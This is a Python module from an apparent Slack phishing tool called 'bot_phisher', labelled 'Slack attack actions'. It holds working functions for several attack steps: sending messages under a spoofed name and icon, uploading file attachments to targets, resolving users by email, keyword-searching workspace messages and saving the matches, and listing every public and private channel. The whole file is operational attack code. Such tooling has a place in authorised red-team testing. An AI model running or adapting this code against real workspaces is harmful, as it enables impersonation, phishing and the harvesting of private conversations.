"""Slack attack actions: send, spoof, attach, search, list channels."""

from slack.errors import SlackApiError

from bot_phisher.core.logger import log_info, log_result


def lookup_user_by_email(client, email):
    """Resolve email to Slack user ID. Returns user_id or None."""
    try:
        result = client.api_call(f"users.lookupByEmail?email={email}")
        return result["user"]["id"]
    except SlackApiError:
        return None


def lookup_channel(client, channel_name):
    """Resolve channel name to channel ID. Returns channel_id or None."""
    try:
        result = client.conversations_list(
            types="public_channel,private_channel"
        )
        for chan in result["channels"]:
            if chan["name"] == channel_name:
                return chan["id"]
    except SlackApiError as e:
        log_info(f"[red]Channel lookup error: {e.response['error']}[/red]")
    return None


def send_spoofed_message(client, target_id, bot_name_label, message, icon_url=""):
    """Send a spoofed message with custom name and icon."""
    try:
        client.chat_postMessage(
            channel=target_id, username=bot_name_label,
            icon_url=icon_url, text=message,
        )
        return True, f"Delivered to {target_id}"
    except SlackApiError as e:
        return False, e.response["error"]


def send_message(client, target_id, message):
    """Send a message as the bot identity."""
    try:
        client.chat_postMessage(channel=target_id, text=message)
        return True, f"Delivered to {target_id}"
    except SlackApiError as e:
        return False, e.response["error"]


def send_file(client, target_id, file_path, message, file_title):
    """Send a file attachment with a message."""
    try:
        client.files_upload(
            channels=target_id, file=file_path,
            title=file_title, initial_comment=message,
        )
        return True, f"File sent to {target_id}"
    except SlackApiError as e:
        return False, e.response["error"]


def search_messages(client, keyword, outfile=None):
    """Search Slack messages by keyword. Returns list of match texts."""
    try:
        result = client.search_messages(query=keyword, sort="timestamp")
        matches = result.data["messages"]["matches"]
        texts = [m["text"] for m in matches]
        if not texts:
            log_info("[yellow]No results found.[/yellow]")
            return []
        for text in texts:
            log_info(text)
        if outfile:
            with open(outfile, "w") as f:
                f.write("\n".join(texts))
            log_info(f"[cyan]Results saved to {outfile}[/cyan]")
        return texts
    except SlackApiError as e:
        log_info(f"[red]Search error: {e.response['error']}[/red]")
        return []


def list_channels(client, outfile=None):
    """List all public/private channels. Returns list of names."""
    channels = []
    cursor = None
    try:
        while True:
            kwargs = {"types": "public_channel,private_channel", "limit": 999}
            if cursor:
                kwargs["cursor"] = cursor
            result = client.conversations_list(**kwargs)
            channels.extend([c["name"] for c in result["channels"]])
            cursor = result.get("response_metadata", {}).get("next_cursor")
            if not cursor:
                break
    except SlackApiError as e:
        log_info(f"[red]Channel list error: {e.response['error']}[/red]")
    for name in channels:
        log_info(f"  {name}")
    if outfile and channels:
        with open(outfile, "w") as f:
            f.write("\n".join(channels))
        log_info(f"[cyan]Channel list saved to {outfile}[/cyan]")
    return channels
